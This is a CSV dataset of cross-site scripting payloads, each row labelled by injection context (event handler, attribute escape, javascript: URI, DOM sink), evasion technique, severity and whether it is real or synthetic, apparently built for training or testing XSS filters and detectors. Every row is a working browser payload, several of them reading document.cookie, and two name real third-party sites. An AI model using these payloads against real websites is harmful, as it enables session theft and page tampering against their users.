payload,context,technique,severity,length,source
%27 onmouseenter=prompt(1) %27,attribute_escape,synthetic,medium,30,synthetic
"<big onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,79,real
<data onpointerout=alert(1) style=display:block>AnonKryptiQuz</data>,event_handler,none,medium,68,real
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",event_handler,none,medium,99,real
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,event_handler,none,medium,58,real
"<center ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,93,real
%3Csvg onload=console.log(1)%3E,tag_injection,synthetic,medium,31,synthetic
</br style=a:expression(alert())>,generic,none,medium,33,real
<nobr onpointermove=alert(1) style=display:block>AnonKryptiQuz</nobr>,event_handler,none,medium,69,real
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionstart=alert(1)></form>",event_handler,none,medium,108,real
"#""onmouseover=""alert(1)",event_handler,none,medium,23,real
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionstart=alert(1)></title>",event_handler,none,medium,110,real
"<optgroup draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,94,real
"<figure draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</figure>",event_handler,none,medium,65,real
<body id=x tabindex=1 onfocus=alert(1)></body>,event_handler,none,medium,46,real
"<IMG SRC=""javascript:alert('XSS');"">",js_uri,case_variation,medium,36,real
"?base=javascript:alert(0)"",",js_uri,none,medium,27,real
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,event_handler,none,medium,76,real
"<summary draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",event_handler,none,medium,92,real
"""><script+src=""https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374""></script>",script_injection,none,medium,174,real
"<img2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></img2>",event_handler,none,medium,281,real
"<base draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,66,real
"<label onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</label>",event_handler,none,medium,86,real
"<font oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</font>",event_handler,none,medium,71,real
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",event_handler,none,medium,109,real
"<style>:target {transform: rotate(180deg);}</style><progress id=x style=""transition:transform 2s"" ontransitionrun=print()></progress>",event_handler,none,low,133,real
"' onerror=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,50,synthetic
' onfocus=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,46,synthetic
"<script>//confirm(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,57,synthetic
"<img \x47src=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
""" oNmoUseEntEr=ConSolE.lOg('XSS') """,attribute_escape,synthetic,medium,35,synthetic
"<datalist oncontextmenu=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,59,real
"<code onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</code>",event_handler,none,medium,81,real
<svg onload=prompt(%27XSS%27)/>,tag_injection,synthetic,medium,31,synthetic
<iframe2 onpointerdown=alert(1) style=display:block>AnonKryptiQuz</iframe2>,event_handler,none,medium,75,real
<link onreadystatechange=alert(1) rel=stylesheet href=1>,event_handler,none,medium,56,real
j&#97;v&#97;script:void(consol&#101;.log(loc&#97;tion.h&#97;sh)),js_uri,synthetic,medium,64,synthetic
"<style>:target {color: red;}</style><template id=x style=""transition:color 10s"" ontransitioncancel=print()></template>",event_handler,none,low,118,real
"<bdi onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",event_handler,none,medium,67,real
"""><svg onmouseover=prompt(location.hash)>",tag_injection,synthetic,medium,41,synthetic
"<script onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,73,real
"""><svg onmouseenter=alert('XSS')>",tag_injection,synthetic,medium,33,synthetic
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,event_handler,none,low,116,real
<isindex type=image onload=alert(1) src=validimage.png>,event_handler,none,medium,55,real
"<p draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</p>",event_handler,none,medium,58,real
"<div draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</div>",event_handler,none,medium,64,real
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",event_handler,none,medium,79,real
"<data draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</data>",event_handler,none,medium,66,real
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",event_handler,none,medium,114,real
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",event_handler,none,medium,99,real
' oNclIck=coNfiRm(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,34,synthetic
e.g: 14.rs/#alert(document.domain),dom_sink,none,medium,34,real
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,64,real
"s&#101;tTim&#101;out(""prompt(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink,synthetic,medium,72,synthetic
"<ol draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,82,real
"<col draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,62,real
"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable style=display:block>drop here</aside>",event_handler,none,medium,131,real
"<xmp draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</xmp>",event_handler,none,medium,62,real
"setTimeout(%22alert(String.fromCharCode(88,83,83))%22,0)",dom_sink,synthetic,medium,56,synthetic
"<sub draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,79,real
"<textarea onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,77,real
"<object onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,73,real
"<table oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,73,real
""" onclick=prompt(location.hash) """,attribute_escape,synthetic,medium,33,synthetic
<svg onlo&#97;d=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,51,synthetic
"<style>:target {color:red;}</style><abbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></abbr>",event_handler,none,medium,106,real
<script\x00>javascript:alert(2828)</script>,script_injection,none,medium,43,real
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionend=alert(1)></meta>",event_handler,none,medium,106,real
"<Rxss onscrollend=alert(origin) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br>++</Rxss>",event_handler,case_variation,medium,125,real
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",event_handler,none,medium,72,real
%3Csvg onload=alert(document.cookie)%3E,tag_injection,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable style=display:block>drop here</hgroup>",event_handler,none,medium,133,real
"<tbody onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,85,real
'><script>alert(123)</script>,script_injection,none,medium,29,real
"""><svg onclick=alert(document.cookie)>",tag_injection,synthetic,medium,38,synthetic
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>,event_handler,none,medium,72,real
"<slot onmousemove=""alert(1)"">AnonKryptiQuz</slot>",event_handler,none,medium,49,real
<button popovertarget=x>Click me</button><colgroup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</colgroup>,event_handler,none,medium,112,real
<title onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<footer onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,71,real
"<BR SIZE=""&{alert(9194)}"">",attribute_escape,case_variation,medium,26,real
"<xmp draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</xmp>",event_handler,none,medium,59,real
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,event_handler,none,medium,72,real
"<dir draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,64,real
"""&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;",event_handler,none,medium,67,real
"<img src=""javascript:alert('AnonKryptiQuz')"" alt=""Image"">",js_uri,none,medium,57,real
<font id=x tabindex=1 onbeforeactivate=alert(1)></font>,event_handler,none,medium,55,real
"<marquee onmouseout=""alert(1)"">AnonKryptiQuz</marquee>",event_handler,none,medium,54,real
"<applet oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<plaintext onmouseleave=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,60,real
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",event_handler,none,medium,91,real
<button onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<tfoot onmouseleave=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,52,real
<noframes onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</noframes>,event_handler,none,medium,82,real
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,74,real
"<mark onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,69,real
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable style=display:block>drop here</spacer>",event_handler,none,medium,133,real
j&#97;v&#97;script:void(confirm('XSS')),js_uri,synthetic,medium,39,synthetic
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",js_uri,none,low,98,real
<blink onpointerenter=alert(1) style=display:block>AnonKryptiQuz</blink>,event_handler,none,medium,72,real
"<rb onclick=""alert(1)"">AnonKryptiQuz</rb>",event_handler,none,medium,41,real
eval('alert(1)');,dom_sink,encoding,high,17,real
"<svG oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<embed onmouseenter=""alert(1)"">AnonKryptiQuz</embed>",event_handler,none,medium,52,real
"<svg oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,69,real
#blalala');alert(1);('a,generic,none,medium,23,real
"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable style=display:block>drop here</keygen>",event_handler,none,medium,133,real
"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable style=display:block>drop here</ins>",event_handler,none,medium,127,real
">'>""><script>alert();</script>",script_injection,none,medium,30,real
"<iframe src-doc=""<svg onload=alert (1337)&nvgt;""></iframe>",event_handler,none,low,58,real
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></source>",event_handler,none,medium,116,real
<ol onpointermove=alert(1) style=display:block>AnonKryptiQuz</ol>,event_handler,none,medium,65,real
<textarea onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,59,real
<b <script>alert(0618)</script>0,script_injection,none,medium,32,real
"<div onmouseleave=""alert(1)"">AnonKryptiQuz</div>",event_handler,none,medium,48,real
"<samp draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,84,real
"<multicol onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,74,real
"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,67,real
"<col onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</col>",event_handler,none,medium,65,real
"<div draggable=""true"" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable style=display:block>drop here</datalist>",event_handler,none,medium,137,real
eval(%22confirm(location.hash)%22),dom_sink,synthetic,medium,34,synthetic
"""><svg onclick=\u0061lert(document.domain)>",tag_injection,synthetic,medium,43,synthetic
<!--><svg onload=alert(1)-->.html,event_handler,comment_injection,medium,33,real
"javascript://'//"" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*",event_handler,none,medium,90,real
"""%3E%3Csvg onerror=confirm(document.domain)%3E",tag_injection,synthetic,medium,46,synthetic
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=print()></samp>",event_handler,none,low,110,real
<strike onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi,generic,url_encoding,medium,56,real
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,event_handler,none,medium,75,real
"""%3E%3Csvg onload=alert('XSS')%3E",tag_injection,synthetic,medium,33,synthetic
"<fieldset draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,72,real
"<style>:target {color:red;}</style><nav id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></nav>",event_handler,none,medium,110,real
"<section onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,69,real
"<nextid onmouseout=""alert(1)"">AnonKryptiQuz</nextid>",event_handler,none,medium,52,real
"<td draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,62,real
javascript:void(confirm(%27XSS%27)),js_uri,synthetic,medium,35,synthetic
"<dialog draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,90,real
"<picture onmousemove=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,55,real
for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7,event_handler,url_encoding,low,190,real
"<input2 onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</input2>",event_handler,none,medium,88,real
"<code ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</code>",event_handler,none,medium,89,real
"<s draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</s>",event_handler,none,medium,60,real
"<strong onmouseup=""alert(1)"">AnonKryptiQuz</strong>",event_handler,none,medium,51,real
"<big onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,68,real
"<br oncontextmenu=""alert(1)"">AnonKryptiQuz</br>",event_handler,none,medium,47,real
"<tbody draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,86,real
' onmouseover=confirm(document.domain) ',attribute_escape,synthetic,medium,40,synthetic
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<mark contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
<select id=x tabindex=1 onbeforeactivate=alert(1)></select>,event_handler,none,medium,59,real
"<ruby onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></ruby>",event_handler,none,medium,281,real
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",script_injection,comment_injection,medium,76,real
